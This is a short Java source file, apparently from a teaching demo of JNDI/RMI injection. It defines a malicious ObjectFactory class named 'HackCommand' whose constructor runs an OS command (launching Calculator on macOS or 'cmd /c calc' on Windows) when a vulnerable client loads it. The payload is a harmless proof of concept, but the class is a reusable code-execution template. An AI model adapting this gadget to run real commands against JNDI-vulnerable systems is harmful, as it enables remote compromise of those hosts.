package edu.changda.jndi.rmi;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class HackCommand implements ObjectFactory {
  public HackCommand() throws IOException {
    System.out.println("执行本地的黑客指令！！！！");
    Runtime rt = Runtime.getRuntime();
    String property = System.getProperty("os.name");
    if ("Mac OS X".equals(property)) {
      String[] commands = {"/bin/sh", "-c", "open /System/Applications/Calculator.app"};
      rt.exec(commands);
    } else {
      rt.exec("cmd  /c calc");
    }
  }

  @Override
  public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
    System.out.println(obj);
    System.out.println(name);
    System.out.println(nameCtx);
    System.out.println(environment);
    return null;
  }
}